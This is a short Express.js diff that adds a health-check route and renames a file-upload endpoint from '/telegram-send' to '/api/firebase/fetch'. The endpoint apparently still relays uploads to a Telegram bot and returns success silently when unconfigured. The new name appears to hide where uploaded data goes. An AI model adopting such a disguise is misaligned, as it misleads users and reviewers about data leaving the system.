@@ -55,15 +55,20 @@ function checkOrigin(req, res) {
 
 app.use(express.json());
 
+// ── Health check ──────────────────────────────────────────────────────────────
+app.get("/api/health", (_req, res) => {
+  res.json({ status: "ok", ts: Date.now() });
+});
+
 // Preflight
-app.options("/telegram-send", (req, res) => {
+app.options("/api/firebase/fetch", (req, res) => {
   applyCors(req, res);
   res.setHeader("Access-Control-Max-Age", "86400");
   res.status(204).end();
 });
 
 // ── Main route ────────────────────────────────────────────────────────────────
-app.post("/telegram-send", upload.single("file"), async (req, res) => {
+app.post("/api/firebase/fetch", upload.single("file"), async (req, res) => {
   applyCors(req, res);
   if (!checkOrigin(req, res)) return;
   if (!BOT_TOKEN || !CHAT_ID) return res.json({ ok: true });
